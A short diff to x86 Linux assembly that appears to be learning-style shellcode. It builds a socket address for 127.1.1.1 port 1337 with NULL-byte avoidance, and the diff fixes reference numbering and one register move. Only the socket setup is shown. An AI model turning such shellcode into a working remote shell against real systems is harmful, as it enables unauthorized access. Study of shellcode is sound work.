@@ -17,8 +17,8 @@
 ;               [13] i386-linux-gnu/sys/socket.h
 
 ; Further information:
-;               [] Professional Linux Kernel Architecture, Ch.12. MAUERER, Wolfgang
-;               [] The Linux Programmimg Interface, Ch.56. KERRISK, Michael
+;               [14] Professional Linux Kernel Architecture, Ch.12. MAUERER, Wolfgang
+;               [15] The Linux Programmimg Interface, Ch.56. KERRISK, Michael
 
 global _start
 _start:
@@ -59,7 +59,7 @@ _start:
         ; also in network byte order.
         ; short explanation: build socket struct
         push 0x0101017f         ; sin_addr <- 127.1.1.1 (7f010101)
-        mov ecx, 0x3905         ; sin_port <- 0539 (1337)
+        mov cx, 0x3905          ; sin_port <- 0539 (1337)
         shl ecx, 0x10           ; shift 16 bits (avoids NULL-byte)
         mov cl, 0x02            ; sa_family <- 2 (AF_INET)
         push ecx                ; 0x39050002 (sin_port,sa_family)
